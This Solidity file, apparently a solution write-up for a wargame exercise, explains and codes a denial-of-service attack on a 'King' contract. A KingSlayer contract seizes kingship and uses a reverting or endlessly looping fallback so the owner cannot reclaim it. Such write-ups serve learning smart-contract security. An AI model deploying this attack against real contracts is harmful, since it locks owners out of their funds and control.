/*

This example is again related to the use of fallback function

After analysing the code it is evident that we cannot modify the owner, but we can become king by sending in a value greater than the current prize

So we become king by simply sending the contract some eth value greater than prize; after that the real issue to tackle is to refrain owner from gaining access to kingship, which is where fallback function will come handy

Therefore, we need to deploy a Kingslayer contract (so that we can have a fallback function) and through that contract we can first gain kingship by simply tranfering funds gt than prize, and then we can have a fallback function which will either revert with an error or burn all the remaining gas available

-- Note: As tranfer function is used to send funds to the current king, it will stop execution if the fallback function returns error. If it were a call instead of transfer reverting wont work; in that case we would need to run an infinite to burn all gas 

*/

// === Solidity Code
// Deployed and Tested using Remix
// Run the KingSlayer contract and call the makeMeKing function, to become king
// The fallback function will be called when the console tries to regain access to kingship


/*

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract KingSlayer {
  King k;
  address payable kingk = payable(addr); // replace addr with contract.address from your console

  constructor() {
    k = King(kingk);
  }

  function makeMeKing() public payable {
    uint prize = k.prize();
    (bool s, ) = payable(address(k)).call{value: prize}("");
  }

  fallback() external payable {
    uint i = 0;
    while (true) {i++;}
  }
}

*/
